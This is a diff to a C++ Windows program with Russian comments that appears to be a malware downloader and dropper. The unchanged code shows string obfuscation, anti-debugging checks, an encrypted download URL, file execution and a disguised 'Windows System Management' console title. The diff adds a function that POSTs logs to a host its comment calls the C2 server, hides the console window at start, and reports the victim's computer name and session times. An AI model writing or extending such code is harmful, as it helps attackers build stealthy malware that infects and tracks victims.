@@ -13,6 +13,7 @@
 #include "skCrypter.h"
 #include <fstream>
 
+
 #pragma comment(lib, "urlmon.lib")
 #pragma comment(lib, "wininet.lib")
 #pragma comment(lib, "shlwapi.lib")
@@ -37,14 +38,79 @@ typedef struct _PROCESS_BASIC_INFORMATION {
     ULONG InheritedFromUniqueProcessId;
 } PROCESS_BASIC_INFORMATION;
 
+bool sendLogToServer(const std::string& logMessage) {
+    const char* server = "192.168.100.1"; // IP сервера C2
+    const char* resource = "/log"; // Путь на сервере для приёма логов
+    const int port = 5001; // Порт сервера
+
+    HINTERNET hInternet = InternetOpenA("MyLogClient", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    if (!hInternet) return false;
+
+    // Соединяемся с сервером
+    HINTERNET hConnect = InternetConnectA(hInternet, server, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+    if (!hConnect) {
+        InternetCloseHandle(hInternet);
+        return false;
+    }
+
+    // Создаём POST запрос
+    const char* acceptTypes[] = { "application/json", NULL };
+    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", resource, NULL, NULL, acceptTypes, 0, 0);
+    if (!hRequest) {
+        InternetCloseHandle(hConnect);
+        InternetCloseHandle(hInternet);
+        return false;
+    }
+
+    // Формируем тело запроса (например, JSON с сообщением)
+    std::string postData = "{\"log\":\"" + logMessage + "\"}";
+
+    BOOL sent = HttpSendRequestA(hRequest,
+        "Content-Type: application/json\r\n",
+        -1,
+        (LPVOID)postData.c_str(),
+        (DWORD)postData.length());
+
+    bool result = sent == TRUE;
+
+    InternetCloseHandle(hRequest);
+    InternetCloseHandle(hConnect);
+    InternetCloseHandle(hInternet);
+
+    return result;
+}
+
+std::string getCurrentTimeString() {
+    time_t now = time(NULL);
+    struct tm timeInfo;
+    localtime_s(&timeInfo, &now);
+
+    char buffer[20];
+    strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", &timeInfo);
+    return std::string(buffer);
+}
+
+std::string getComputerName() {
+    char name[MAX_COMPUTERNAME_LENGTH + 1];
+    DWORD size = sizeof(name);
+    if (GetComputerNameA(name, &size)) {
+        return std::string(name, size);
+    }
+    return "UnknownComputer";
+}
+
+
+
 void writeLog(const std::string& message) {
-    std::ofstream logFile("debug_log.txt", std::ios_base::app);
-    if (logFile.is_open()) {
-        logFile << message << std::endl;
-        logFile.close();
+    // Пытаемся отправить на сервер
+    if (!sendLogToServer(message)) {
+        // Здесь НЕ сохраняем локально — просто пропускаем
+        // Можно добавить вывод в консоль, если хочешь
+        // std::cerr << "Failed to send log to server, log discarded." << std::endl;
     }
     std::cout << message << std::endl;
 }
+
 
 //  антиотладочные методы
 bool detectDbgBreakPointPatch() {
@@ -197,6 +263,7 @@ std::wstring getDownloadURL() {
     return url.decrypt();
 }
 
+
 bool checkInternetConnection() {
     const wchar_t* servers[] = {
         skCrypt(L"https://www.google.com"),
@@ -240,10 +307,32 @@ bool executeFile(const std::wstring& filePath) {
     return result;
 }
 
+
+void writeSessionSeparator() {
+    time_t now = time(NULL);
+    char timeStr[64];
+    struct tm* timeInfo = localtime(&now); // сохраняем результат localtime
+    strftime(timeStr, sizeof(timeStr), "%Y-%m-%d %H:%M:%S", timeInfo);
+
+    std::string computerName = getComputerName();
+    
+
+    writeLog("\n----- New Session Started -----");
+    writeLog("Time: " + std::string(timeStr));
+    writeLog("Computer Name: " + computerName);
+    writeLog("------------------------------\n");
+}
+
 int main() {
+
+    HWND consoleWindow = GetConsoleWindow();
+    ShowWindow(consoleWindow, SW_HIDE);
+
     srand(static_cast<unsigned int>(time(NULL) ^ GetCurrentProcessId()));
     auto consoleTitle = skCrypt(L"Windows System Management");
     SetConsoleTitleW(consoleTitle);
+
+    writeSessionSeparator();
 
     char currentDir[MAX_PATH];
     if (GetCurrentDirectoryA(MAX_PATH, currentDir)) {
@@ -264,7 +353,7 @@ int main() {
         return 0;
     }
 
-   
+
     wchar_t tempPath[MAX_PATH];
     if (GetTempPathW(MAX_PATH, tempPath) == 0) {
         writeLog("Failed to get temp path.");
